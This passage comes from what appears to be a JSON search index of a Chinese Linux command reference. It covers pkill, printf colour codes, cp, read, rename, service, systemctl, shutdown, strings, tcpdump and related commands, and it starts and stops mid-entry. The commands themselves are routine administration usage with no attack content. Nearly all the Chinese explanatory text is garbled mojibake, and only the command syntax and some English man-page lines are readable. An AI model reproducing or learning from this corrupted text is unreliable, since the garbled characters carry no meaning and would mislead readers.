0.02s -bash å¯ä»¥çœ‹å‡ºå½“å‰ä¸»æœºå·²ç»ç™»å½•äº†ä¸‰ä¸ªrootç”¨æˆ·ï¼Œä¸€ä¸ªæ˜¯æœ¬åœ°ç»ˆç«¯ttylç™»å½•ï¼Œ å¦å¤–ä¸¤ä¸ªæ˜¯ä»192.168.0.100ç™»é™†çš„è¿œç¨‹ç™»å½• å¼ºåˆ¶æ€æ­»ä»pts/1è™šæ‹Ÿç»ˆç«¯ç™»é™†çš„è¿›ç¨‹: [root@localhost ~]# pkill -9 -t pts/1 [root@localhost ~]# w 20:09:09 up 30 min, 2 users, load average: 0.00, 0.00,0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT root ttyl - 19:47 21:27 0.01s 0.01s -bash root pts/0 192.168.0.100 19:47 0.00s 0.06s 0.00s w è™šæ‹Ÿç»ˆç«¯pts/1çš„ç™»å½•è¿›ç¨‹å·²ç»è¢«æ€æ­»äº†","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pkill.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pkill.html"},{"title":"printf","text":"åŠŸèƒ½ ä¸æ¢è¡Œæ‰“å° ä½¿ç”¨ printf \"\\e[1;36;45m%s\\e[0m\\n\" \" ${ _strs } \" æ‹“å±•--å…³äºä½¿ç”¨é¢œè‰²è¾“å‡º é¢œè‰²è¾“å‡ºç›¸å…³å­—ç¬¦è¯´æ˜ \\e è½¬ä¹‰èµ·å§‹ç¬¦ï¼Œå®šä¹‰ä¸€ä¸ªè½¬ä¹‰åºåˆ—ï¼Œ å¯ä»¥ä½¿ç”¨ 033ä»£æ›¿ [ è¡¨ç¤ºå¼€å§‹å®šä¹‰é¢œè‰² 1è¡¨ç¤ºé«˜äº®ï¼Œ36è¡¨ç¤ºå­—ä½“é¢œè‰²ä¸ºå¤©è“ï¼Œ45è¡¨ç¤ºèƒŒæ™¯è‰²ä¸ºçº¢è‰² \"_strs\" å±äºæ–‡å­—å†…å®¹ m è½¬ä¹‰ç»ˆæ­¢ç¬¦ï¼Œè¡¨ç¤ºé¢œè‰²å®šä¹‰å®Œæ¯• å†æ¬¡ä½¿ç”¨ e[ ï¼Œè¡¨ç¤ºå†æ¬¡å¼€å¯é¢œè‰²å®šä¹‰ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤çš„é¢œè‰²ï¼Œmè¡¨ç¤ºé¢œè‰²å®šä¹‰ç»“æŸï¼Œæ‰€ä»¥ e[0m çš„ä½œç”¨æ˜¯æ¢å¤ä¹‹å‰çš„é…è‰²æ–¹æ¡ˆ æ•°å­—ä¸é¢œè‰²å…³ç³» å­—ä½“é¢œè‰²(å‰æ™¯è‰²): 30-37 æ•°å­— é¢œè‰² 0 é»˜è®¤ 30 é»‘è‰² 31 çº¢è‰² 32 ç»¿è‰² 33 é»„è‰² 34 è“è‰² 35 ç´«è‰² 36 å¤©è“è‰² 37 ç™½è‰² å­—èƒŒæ™¯é¢œè‰²(åæ™¯è‰²): 40-47 æ•°å­— é¢œè‰² 0 é»˜è®¤ 40 é»‘è‰² 41 çº¢è‰² 42 ç»¿è‰² 43 é»„è‰² 44 è“è‰² 45 ç´«è‰² 46 å¤©è“è‰² 47 ç™½è‰² å…¶ä»–ç‰¹æ®Šé¢œè‰²-é»‘åº•å½©è‰² é»‘åº•å½©è‰²: 90-97 æ•°å­— é¢œè‰² 90 é»‘ 91 æ·±çº¢ 92 ç»¿ 93 é»„è‰² 94 è“è‰² 95 ç´«è‰² 96 æ·±ç»¿ 97 ç™½è‰² å­—ä½“æ§åˆ¶é€‰é¡¹ å­—ä½“æ§åˆ¶é€‰é¡¹ ä»£ç  \\033[0m å…³é—­æ‰€æœ‰å±æ€§ \\033[1m è®¾ç½®é«˜äº®åº¦ \\033[4m ä¸‹åˆ’çº¿ \\033[5m é—ªçƒ \\033[7m åæ˜¾ï¼Œæ’è‰²æ˜¾ç¤ºï¼Œæ˜¾ç¤ºä¸ºç™½è‰²é»‘åº•ï¼Œæˆ–è€…æ˜¾ç¤ºä¸ºé»‘åº•ç™½å­— \\033[8m æ¶ˆå½±ï¼Œå­—ç¬¦é¢œè‰²å°†ä¼šä¸èƒŒæ™¯é¢œè‰²ç›¸åŒ \\033[nA å…‰æ ‡ä¸Šç§»nè¡Œ \\033[nB å…‰æ ‡ä¸‹ç§»nè¡Œ \\033[nC å…‰æ ‡å³ç§»nè¡Œ \\033[nD å…‰æ ‡å·¦ç§»nè¡Œ \\033[y;xH è®¾ç½®å…‰æ ‡ä½ç½® \\033[2J æ¸…å± \\033[K æ¸…é™¤ä»å…‰æ ‡åˆ°è¡Œå°¾çš„å†…å®¹ \\033[s ä¿å­˜å…‰æ ‡ä½ç½® \\033[u æ¢å¤å…‰æ ‡ä½ç½® \\033[?25l éšè—å…‰æ ‡ \\033[?25h æ˜¾ç¤ºå…‰æ ‡ å¦æœ‰ä¸€ä¸ªæ›´ä¾¿æ·çš„å‘½ä»¤ ./tput æŠ€å·§ echoçš„ \\e å’Œ \\033 ä¸€ä¸ªæ•ˆæœ","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-printf.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-printf.html"},{"title":"cp","text":"ç”¨äºå¤åˆ¶æ–‡ä»¶æˆ–ç›®å½• -a æ­¤é€‰é¡¹é€šå¸¸åœ¨å¤åˆ¶ç›®å½•æ—¶ä½¿ç”¨ï¼Œå®ƒä¿ç•™é“¾æ¥ã€æ–‡ä»¶å±æ€§ï¼Œå¹¶å¤åˆ¶ç›®å½•ä¸‹çš„æ‰€æœ‰å†…å®¹ã€‚å…¶ä½œç”¨ç­‰äºdpRå‚æ•°ç»„åˆã€‚ -d å¤åˆ¶æ—¶ä¿ç•™é“¾æ¥ã€‚è¿™é‡Œæ‰€è¯´çš„é“¾æ¥ç›¸å½“äºWindowsç³»ç»Ÿä¸­çš„å¿«æ·æ–¹å¼ã€‚ -f è¦†ç›–å·²ç»å­˜åœ¨çš„ç›®æ ‡æ–‡ä»¶è€Œä¸ç»™å‡ºæç¤ºã€‚ -i ä¸-fé€‰é¡¹ç›¸åï¼Œåœ¨è¦†ç›–ç›®æ ‡æ–‡ä»¶ä¹‹å‰ç»™å‡ºæç¤ºï¼Œè¦æ±‚ç”¨æˆ·ç¡®è®¤æ˜¯å¦è¦†ç›–ï¼Œå›ç­”\"y\"æ—¶ç›®æ ‡æ–‡ä»¶å°†è¢«è¦†ç›–ã€‚ -p é™¤å¤åˆ¶æ–‡ä»¶çš„å†…å®¹å¤–ï¼Œè¿˜æŠŠä¿®æ”¹æ—¶é—´å’Œè®¿é—®æƒé™ä¹Ÿå¤åˆ¶åˆ°æ–°æ–‡ä»¶ä¸­ã€‚ -r è‹¥ç»™å‡ºçš„æºæ–‡ä»¶æ˜¯ä¸€ä¸ªç›®å½•æ–‡ä»¶ï¼Œæ­¤æ—¶å°†å¤åˆ¶è¯¥ç›®å½•ä¸‹æ‰€æœ‰çš„å­ç›®å½•å’Œæ–‡ä»¶ã€‚ -l ä¸å¤åˆ¶æ–‡ä»¶ï¼Œåªæ˜¯ç”Ÿæˆé“¾æ¥æ–‡ä»¶ã€‚ -n ä¸è¦†ç›–å·²å­˜åœ¨çš„æ–‡ä»¶(é™¤éä½¿ç”¨äº†-i/-f) Do not overwrite an existing file. (The -n option overrides any previous -f or -i options.) æ³¨è§£ åƒcp, mvè¿™ç§æŒ‡ä»¤, ä¸€èˆ¬éƒ½æ˜¯å½“ç›®æ ‡ä½ç½®ä¸å­˜åœ¨æ—¶, å°±é‡å‘½å, ç›®æ ‡ä½ç½®å­˜åœ¨ä¸”ä¸ºç›®å½•æ—¶, cp/mvåˆ°è¿™ä¸ªç›®å½•ä¸‹; å½“ç›®æ ‡æ–‡ä»¶å­˜åœ¨æ—¶å€™, ä¼šç›´æ¥è¦†ç›–æ‰, ä½¿ç”¨ -n ä¸è¦†ç›–.","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-product.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-product.html"},{"title":"pwck","text":"æ£€æŸ¥è´¦å·æ–‡ä»¶ /etc/passwd é…ç½®ä¿¡æ¯æ˜¯å¦æ­£ç¡® ä¼šä¸ /etc/shadow æ¯”å¯¹","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pwck.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pwck.html"},{"title":"reboot","text":"é€šçŸ¥ç³»ç»Ÿé‡å¯: # reboot ### é‡å¯æœºå™¨ # reboot --halt ### åœæ­¢æœºå™¨ # reboot -p ### å…³é—­æœºå™¨","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-reBoot.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-reBoot.html"},{"title":"read","text":"åŠŸèƒ½ ä»é”®ç›˜è¯»å–è¾“å…¥ ä½¿ç”¨: read [-options] [ variables ] é€‰é¡¹ é€‰é¡¹å‚æ•° é€‰é¡¹ å«ä¹‰ -p è¾“å…¥æç¤ºä¿¡æ¯ -r ä¸è½¬ä¹‰è¯»å– -n num ä»…è¯»å– num ä¸ªå­—ç¬¦ä¸², è€Œéæ•´è¡Œ -a array æŠŠè¯»å–çš„æ•°æ®èµ‹å€¼ç»™æ•°ç»„ arrayï¼Œä»ä¸‹æ ‡ 0 å¼€å§‹ã€‚ -d delimiter ç”¨å­—ç¬¦ä¸² delimiter æŒ‡å®šè¯»å–ç»“æŸçš„ä½ç½®ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦ï¼ˆè¯»å–åˆ°çš„æ•°æ®ä¸åŒ…æ‹¬ delimiterï¼‰ã€‚ -e åœ¨è·å–ç”¨æˆ·è¾“å…¥çš„æ—¶å€™ï¼Œå¯¹åŠŸèƒ½é”®è¿›è¡Œç¼–ç è½¬æ¢ï¼Œä¸ä¼šç›´æ¥æ˜¾å¼åŠŸèƒ½é”®å¯¹åº”çš„å­—ç¬¦ã€‚ -p prompt æ˜¾ç¤ºæç¤ºä¿¡æ¯ï¼Œæç¤ºå†…å®¹ä¸º prompt ã€‚ -s é™é»˜æ¨¡å¼ï¼ˆ Silent mode ï¼‰ï¼Œä¸ä¼šåœ¨å±å¹•ä¸Šæ˜¾ç¤ºè¾“å…¥çš„å­—ç¬¦ã€‚å½“è¾“å…¥å¯†ç å’Œå…¶å®ƒç¡®è®¤ä¿¡æ¯çš„æ—¶å€™ï¼Œè¿™æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚ -t seconds è®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œå•ä½ä¸ºç§’ã€‚å¦‚æœç”¨æˆ·æ²¡æœ‰åœ¨æŒ‡å®šæ—¶é—´å†…è¾“å…¥å®Œæˆï¼Œé‚£ä¹ˆ read å°†ä¼šè¿”å›ä¸€ä¸ªé 0 çš„é€€å‡ºçŠ¶æ€ï¼Œè¡¨ç¤ºè¯»å–å¤±è´¥ã€‚ -u fd ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦ fd ä½œä¸ºè¾“å…¥æºï¼Œè€Œä¸æ˜¯æ ‡å‡†è¾“å…¥ï¼Œç±»ä¼¼äºé‡å®šå‘ã€‚ ç¤ºä¾‹ #!/bin/bash tip = 'n' while [ \" ${ tip } \" ! = 'y' ] ; do read -p \"æ·»åŠ æˆåŠŸåè¾“å…¥ y ç¡®è®¤ >\" -r tip done","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-read.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-read.html"},{"title":"rename","text":"åœ¨Debianæˆ–è€…Ubuntuç¯å¢ƒä¸‹ä½¿ç”¨çš„è¯­æ³•æ˜¯: rename 's/stringx/stringy/' files è€Œåœ¨CentOSä¸‹æˆ–è€…RedHatä¸‹æ˜¯: rename stringx stringy files renameçš„å‚æ•°åˆ†ä¸ºä¸‰éƒ¨åˆ†: #stringx ï¼š è¢«æ›¿æ¢å­—ç¬¦ä¸² #stringy ï¼šæ›¿æ¢å­—ç¬¦ä¸² #files ï¼šåŒ¹é…çš„æ–‡ä»¶åˆ—è¡¨ æ¯”å¦‚æ‰¹é‡å°†æ‰€æœ‰æ–‡ä»¶åä¸­åŒ…å«çš„ (1) åˆ é™¤æ‰ rename 's/\\(1\\)//' *","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-rename.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-rename.html"},{"title":"runlevel","text":"æŸ¥çœ‹å½“å‰ç³»ç»Ÿè¿è¡Œçš„çº§åˆ«. å³, /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/init çš„æ”¯æŒçš„å€¼","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-runlevel.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-runlevel.html"},{"title":"service","text":"service å‘½ä»¤ä¸ä¼ ç»Ÿçš„ SysVinit å’Œ Upstart åˆå§‹åŒ–ç³»ç»Ÿç›¸å…³ã€‚ è¾ƒæ—©æœŸçš„ Linux å‘è¡Œç‰ˆï¼ˆå¦‚æ—©æœŸçš„ Ubuntuã€Red Hat ç­‰ï¼‰ä½¿ç”¨äº†è¿™äº›åˆå§‹åŒ–ç³»ç»Ÿã€‚ è™½ç„¶è®¸å¤šç°ä»£ Linux å‘è¡Œç‰ˆå·²ç»è½¬å‘ä½¿ç”¨ systemdï¼Œä½†å®ƒä»¬é€šå¸¸ä»ç„¶æä¾› service å‘½ä»¤ä½œä¸ºå‘åå…¼å®¹æ”¯æŒã€‚ serviceå‘½ä»¤å¯ä»¥å¯åŠ¨ã€åœæ­¢ã€é‡æ–°å¯åŠ¨å’Œå…³é—­ç³»ç»ŸæœåŠ¡ï¼Œè¿˜å¯ä»¥æ˜¾ç¤ºæ‰€æœ‰ç³»ç»ŸæœåŠ¡çš„å½“å‰çŠ¶æ€ã€‚ serviceå‘½ä»¤çš„ä½œç”¨æ˜¯å»/etc/init.dç›®å½•ä¸‹å¯»æ‰¾ç›¸åº”çš„æœåŠ¡ï¼Œè¿›è¡Œå¼€å¯å’Œå…³é—­ç­‰æ“ä½œ è¦æŸ¥çœ‹ service å‘½ä»¤æ˜¯å¦è¢«æ˜ å°„åˆ° systemctlï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥ service å‘½ä»¤çš„å®é™…æ–‡ä»¶ç±»å‹å’Œé“¾æ¥æ¥å®ç°: ls -l $(which service) å¦‚æœ service å‘½ä»¤è¢«æ˜ å°„åˆ° systemctlï¼Œè¾“å‡ºç»“æœå¯èƒ½ç±»ä¼¼äº: lrwxrwxrwx 1 root root 21 Oct 13 10:10 /usr/sbin/service -> /usr/bin/systemctl ç¤ºä¾‹ å¼€å¯å…³é—­ä¸€ä¸ªhttpdæœåŠ¡: service httpd start/stop æŸ¥çœ‹ç³»ç»ŸæœåŠ¡çš„çŠ¶æ€: service --status-all","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-service.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-service.html"},{"title":"setfattr","text":"è®¾ç½®æ–‡ä»¶ç³»ç»Ÿå¯¹è±¡çš„æ‰©å±•å±æ€§ å®‰è£…: apt install attr é€‰é¡¹: -n name , --name= name æŒ‡å®šæ‹“å±•å±æ€§åç§° -v value , --value= value æŒ‡å®šæ‹“å±•å±æ€§çš„å€¼, ä¸-nå¯¹åº” -x name , --remove= name ç§»é™¤æŒ‡å®šçš„æ‹“å±•å±æ€§ -h , --no-dereference Do not follow symlinks. If pathname is a symbolic link, it is not followed, but is instead itself the inode being modified. --restore= file Restores extended attributes from file. The file must be in the format generated by the getfattr command with the --dump option. If a dash ( -) is given as the file name, setfattr reads from standard input. --version Print the version of setfattr and exit. --help Print help explaining the command line options. -- End of command line options. All remaining parameters are interpreted as file names, even if they start with a dash character.","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-setfattr.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-setfattr.html"},{"title":"shutdown","text":"shutdown ä¼šç»™ç³»ç»Ÿè®¡åˆ’ä¸€ä¸ªæ—¶é—´å…³æœºã€‚å®ƒå¯ä»¥è¢«ç”¨äºåœæ­¢ã€å…³æœºã€é‡å¯æœºå™¨ã€‚shutdown ä¼šç»™ç³»ç»Ÿè®¡åˆ’ä¸€ä¸ªæ—¶é—´å…³æœºã€‚ å®ƒå¯ä»¥è¢«ç”¨äºåœæ­¢ã€å…³æœºã€é‡å¯æœºå™¨ã€‚ å…³é—­æœºå™¨: shutdown -p now åœæ­¢æœºå™¨: shutdown -H now åœ¨ 09:35am é‡å¯æœºå™¨: shutdown -r 09:35 è¦å–æ¶ˆå³å°†è¿›è¡Œçš„å…³æœºï¼Œåªè¦è¾“å…¥ä¸‹é¢çš„å‘½ä»¤: shutdown -c","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-shutdown.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-shutdown.html"},{"title":"strings","text":"ä¸€èˆ¬ä¼šå†…ç½®, ä½†æ˜¯åƒdockeré‚£ç§éœ€è¦æ‰‹åŠ¨å®‰è£…: apt install binutils æ‰“å°æ–‡ä»¶ä¸­å¯æ‰“å°çš„å­—ç¬¦, å¯ä»¥æ˜¯ æ–‡æœ¬æ–‡ä»¶ï¼ˆtest.cï¼‰ å¯æ‰§è¡Œæ–‡ä»¶(test) ç›®æ ‡æ–‡ä»¶(test.o, é“¾æ¥åå¯ç”ŸæˆåŠ¨æ€åº“) åŠ¨æ€é“¾æ¥åº“(test.so) é™æ€é“¾æ¥åº“(test.a) strings å‘½ä»¤åœ¨å¯¹è±¡æ–‡ä»¶æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æŸ¥æ‰¾å¯æ‰“å°çš„å­—ç¬¦ä¸²ã€‚ å­—ç¬¦ä¸²æ˜¯ 4 ä¸ªæˆ–æ›´å¤šå¯æ‰“å°å­—ç¬¦çš„ä»»æ„åºåˆ—ï¼Œä»¥æ¢è¡Œç¬¦æˆ–ç©ºå­—ç¬¦ç»“æŸã€‚ strings å‘½ä»¤å¯¹è¯†åˆ«éšæœºå¯¹è±¡æ–‡ä»¶å¾ˆæœ‰ç”¨ã€‚ è¯­æ³•: strings [ -a ] [ - ] [ -o ] [ -t Format ] [ -n Number ] [ -Number ] [ File ... ] é€‰é¡¹ -a æˆ– - , æœç´¢æ•´ä¸ªæ–‡ä»¶ï¼Œè€Œä¸ä»…ä»…æ˜¯æ•°æ®æ®µï¼Œä»¥å¯»æ‰¾å¯æ‰“å°çš„å­—ç¬¦ä¸²ã€‚ å¦‚æœçœç•¥è¿™ä¸ªæ ‡å¿—ï¼Œåˆ™ strings å‘½ä»¤åªåœ¨å¯¹è±¡æ–‡ä»¶çš„åˆå§‹åŒ–æ•°æ®ç©ºé—´å†…å¯»æ‰¾ã€‚ -n Number æŒ‡å®šæœ€å°çš„å­—ç¬¦ä¸²é•¿åº¦ï¼ˆé™¤äº†ç¼ºçœçš„ 4 ä¸ªå­—ç¬¦ä»¥å¤–ï¼‰ã€‚ å­—ç¬¦ä¸²é•¿åº¦çš„æœ€å¤§å€¼æ˜¯ 4096ã€‚è¿™ä¸ªæ ‡å¿—ä¸ -Number æ ‡å¿—ç›¸åŒã€‚ -o åˆ—å‡ºæ–‡ä»¶ä¸­æ¯ä¸ªè·Ÿéšåœ¨å…¶å…«è¿›åˆ¶åç§»é‡ä¹‹åçš„å­—ç¬¦ä¸²ã€‚è¿™ä¸ªæ ‡å¿—ä¸ -t o æ ‡å¿—ç›¸åŒã€‚ -t Format åˆ—å‡ºä»æ–‡ä»¶æœ€å¼€å§‹èµ·ï¼Œæ¯ä¸ªè·Ÿéšåœ¨å…¶åç§»é‡ä¹‹åçš„å­—ç¬¦ä¸²ã€‚è¯¥æ ¼å¼å–å†³äºç”¨ä½œ Format å˜é‡çš„å­—ç¬¦ã€‚ d ä»¥åè¿›åˆ¶å†™ä¸‹åç§»é‡ã€‚ o ä»¥å…«è¿›åˆ¶å†™ä¸‹åç§»é‡ã€‚ x ä»¥åå…­è¿›åˆ¶å†™ä¸‹åç§»é‡ã€‚ æ³¨è§£ å½“ -o å’Œ -t Format æ ‡å¿—åœ¨ä¸€ä¸ªå‘½ä»¤è¡Œä¸Šå¤šæ¬¡å®šä¹‰ï¼Œåˆ™æœ€åæŒ‡å®šçš„æ ‡å¿—æ§åˆ¶ strings å‘½ä»¤çš„è¡Œä¸ºã€‚ -N umber æŒ‡å®šæœ€å°çš„å­—ç¬¦ä¸²é•¿åº¦ï¼ˆé™¤äº†ç¼ºçœçš„ 4 ä¸ªå­—ç¬¦ä»¥å¤–ï¼‰ã€‚å­—ç¬¦ä¸²é•¿åº¦çš„æœ€å¤§å€¼æ˜¯ 4096ã€‚è¿™ä¸ªæ ‡å¿—ä¸ -n Number æ ‡å¿—ç›¸åŒã€‚ File è¦æœç´¢çš„äºŒè¿›åˆ¶æ–‡ä»¶æˆ–å¯¹è±¡æ–‡ä»¶ã€‚ æ³¨è§£ stringsè‹¥çœ‹åˆ°åŒä¸€ä¸ªåº“çš„ä¸åŒç‰ˆæœ¬çš„ä¾èµ–, å¦‚: ZLIB_1.2.3.4 ZLIB_1.2.9 æœ‰ä»¥ä¸‹å‡ ç§å¯èƒ½: æ­¤å…±äº«åº“åŒæ—¶ä¾èµ–äº†ä¸¤ä¸ªä¸åŒçš„ç‰ˆæœ¬ ç»´æŠ¤ä¸ä½³, å‡çº§æ–°ç‰ˆæœ¬æ—¶æ²¡æœ‰ç§»é™¤æ—§ç‰ˆæœ¬ è¯¯æŠ¥","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-strings.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-strings.html"},{"title":"sync","text":"å¼ºåˆ¶å°†å†…å­˜ä¸­çš„æ–‡ä»¶ç¼“å†²å†…å®¹å†™åˆ°ç£ç›˜ã€‚ Linux syncå‘½ä»¤ç”¨äºæ•°æ®åŒæ­¥,syncå‘½ä»¤æ˜¯åœ¨å…³é—­Linuxç³»ç»Ÿæ—¶ä½¿ç”¨çš„ã€‚ Linux ç³»ç»Ÿä¸­æ¬²å†™å…¥ç¡¬ç›˜çš„èµ„æ–™æœ‰çš„æ—¶å€™ä¸ºäº†æ•ˆç‡èµ·è§ï¼Œä¼šå†™åˆ° filesystem buffer ä¸­ï¼Œ è¿™ä¸ª buffer æ˜¯ä¸€å—è®°å¿†ä½“ç©ºé—´ï¼Œå¦‚æœæ¬²å†™å…¥ç¡¬ç›˜çš„èµ„æ–™å­˜äºæ­¤ buffer ä¸­ï¼Œ è€Œç³»ç»Ÿåˆçªç„¶æ–­ç”µçš„è¯ï¼Œé‚£ä¹ˆèµ„æ–™å°±ä¼šæµå¤±äº†ï¼Œsync æŒ‡ä»¤ä¼šå°†å­˜äº buffer ä¸­çš„èµ„æ–™å¼ºåˆ¶å†™å…¥ç¡¬ç›˜ä¸­ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-sync.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-sync.html"},{"title":"systemctl","text":"ä¸€ä¸ªsystemdå·¥å…·ï¼Œä¸»è¦è´Ÿè´£æ§åˆ¶systemdç³»ç»Ÿå’ŒæœåŠ¡ç®¡ç†å™¨. systemd æ˜¯è®¸å¤šç°ä»£ Linux å‘è¡Œç‰ˆï¼ˆå¦‚ Ubuntuã€Fedoraã€Debian ç­‰ï¼‰çš„é»˜è®¤åˆå§‹åŒ–ç³»ç»Ÿã€‚ systemd é‡‡ç”¨äº†å¹¶è¡Œå¯åŠ¨æ–¹å¼ï¼Œæä¾›äº†æ›´å¿«çš„å¯åŠ¨é€Ÿåº¦å’Œæ›´é«˜çš„çµæ´»æ€§ã€‚ systemctl æ˜¯ systemd çš„ä¸»è¦å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºæ§åˆ¶å’Œç®¡ç†ç³»ç»ŸæœåŠ¡ã€æŒ‚è½½ç‚¹ã€è®¾å¤‡ç­‰. å®ƒèåˆä¹‹å‰ service å’Œ chkconfig çš„åŠŸèƒ½äºä¸€ä½“ã€‚å¯ä»¥ä½¿ç”¨å®ƒæ°¸ä¹…æ€§æˆ–åªåœ¨å½“å‰ä¼šè¯ä¸­å¯ç”¨/ç¦ç”¨æœåŠ¡ã€‚ Systemd(system daemon)æ˜¯ä¸€ä¸ªç³»ç»Ÿç®¡ç†å®ˆæŠ¤è¿›ç¨‹ã€å·¥å…·å’Œåº“çš„é›†åˆï¼Œç”¨äºå–ä»£System Våˆå§‹è¿›ç¨‹ã€‚ Systemdçš„åŠŸèƒ½æ˜¯ç”¨äºé›†ä¸­ç®¡ç†å’Œé…ç½®ç±»UNIXç³»ç»Ÿã€‚ å¸¸è§ç”¨æ³• åˆ—å‡ºæ‰€æœ‰å¯ç”¨å•å…ƒ: systemctl list-unit-files systemctl list-units åˆ—å‡ºæ‰€æœ‰å¤±è´¥å•å…ƒ: systemctl --failed æ£€æŸ¥æŸä¸ªå•å…ƒæ˜¯å¦å¯åŠ¨: systemctl is-enabled httpd.service æ£€æŸ¥æŸä¸ªæœåŠ¡çš„è¿è¡ŒçŠ¶æ€: systemctl status httpd.service åˆ—å‡ºæ‰€æœ‰æœåŠ¡: systemctl list-unit-files --type=service æŸ¥è¯¢æœåŠ¡æ˜¯å¦æ¿€æ´»: systemctl is-active httpd æœåŠ¡æŸ¥çœ‹æ˜¯å¦é…ç½®å¼€æœºè‡ªå¯åŠ¨: systemctl is-enabled <service-name> æœåŠ¡é…ç½®å¼€æœºè‡ªå¯åŠ¨(ç¦ç”¨+å¯ç”¨): systemctl disable httpd systemctl enable httpd ä½¿ç”¨systemctlå‘½ä»¤æ€æ­»æœåŠ¡: systemctl kill httpd åˆ—å‡ºç³»ç»Ÿçš„å„é¡¹æœåŠ¡ï¼ŒæŒ‚è½½ï¼Œè®¾å¤‡ç­‰: systemctl list-unit-files --type è·å¾—ç³»ç»Ÿé»˜è®¤å¯åŠ¨çº§åˆ«å’Œè®¾ç½®é»˜è®¤å¯åŠ¨çº§åˆ«: systemctl get-default systemctl set-default multi-user.target å¯åŠ¨è¿è¡Œç­‰çº§: systemctl isolate multiuser.target é‡å¯ã€åœæ­¢ï¼ŒæŒ‚èµ·ã€ä¼‘çœ ç³»ç»Ÿç­‰: systemctl reboot systemctl halt systemctl suspend systemctl hibernate systemctl hybrid-sleep","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-systemctl.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-systemctl.html"},{"title":"tcpdump","text":"ä¸€æ¬¾snifferå·¥å…·ï¼Œæ˜¯Linuxä¸Šçš„æŠ“åŒ…å·¥å…·ï¼Œå—…æ¢å™¨ æ–‡å­—æ¥å£çš„å°åŒ…æŠ“å– ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„å‘½ä»¤è¡Œæ•°æ®åŒ…åˆ†æå™¨ï¼Œå®ƒæ˜¯é€šè¿‡ç›‘å¬æœåŠ¡å™¨çš„ç½‘å¡æ¥è·å–æ•°æ®åŒ…ï¼Œ æ‰€æœ‰é€šè¿‡ç½‘ç»œè®¿é—®çš„æ•°æ®åŒ…éƒ½èƒ½è·å–åˆ°ã€‚ å®ƒä¹Ÿæä¾›äº†è¿‡æ»¤å™¨çš„åŠŸèƒ½ï¼Œå¯ä»¥è·å–æŒ‡å®šçš„ç½‘ç»œã€ç«¯å£æˆ–åè®®çš„æ•°æ®åŒ… é€‰é¡¹ -a å°è¯•å°†ç½‘ç»œå’Œå¹¿æ’­åœ°å€è½¬æ¢æˆåç§°ï¼› -c <count> countè¡¨ç¤ºæ•°æ®åŒ…æ•°ç›®. æŠ“å–æ•°æ®åŒ…çš„æ•°é‡è¾¾åˆ°countåç»“æŸå‘½ä»¤ï¼Œå¦‚æœä¸ä½¿ç”¨-c å‚æ•°ï¼Œä¼šä¸åœçš„æŠ“å–æ•°æ®åŒ…ï¼Œç›´åˆ°æ‰‹åŠ¨åœæ­¢ -C <file_size> æŠ“å–æ•°æ®åŒ…ä¿å­˜åˆ°æ–‡ä»¶æ—¶ï¼Œé€šè¿‡è¯¥å‘½ä»¤æŒ‡å®šæ–‡ä»¶çš„å¤§å°ã€‚ æ–‡ä»¶è¾¾åˆ°æŒ‡å®šå¤§å°åï¼Œä¼šåˆ›å»ºä¸€ä¸ªåœ¨åŸæ–‡ä»¶åç§°åé¢åŠ ä¸Šåºå·çš„æ–°æ–‡ä»¶ï¼Œå¦‚ï¼šdump.txtï¼Œdump.txt1ã€‚ file_sizeçš„å•ä½æ˜¯b -d æŠŠç¼–è¯‘è¿‡çš„æ•°æ®åŒ…ç¼–ç è½¬æ¢æˆå¯é˜…è¯»çš„æ ¼å¼ï¼Œå¹¶å€¾å€’åˆ°æ ‡å‡†è¾“å‡ºï¼› -d d 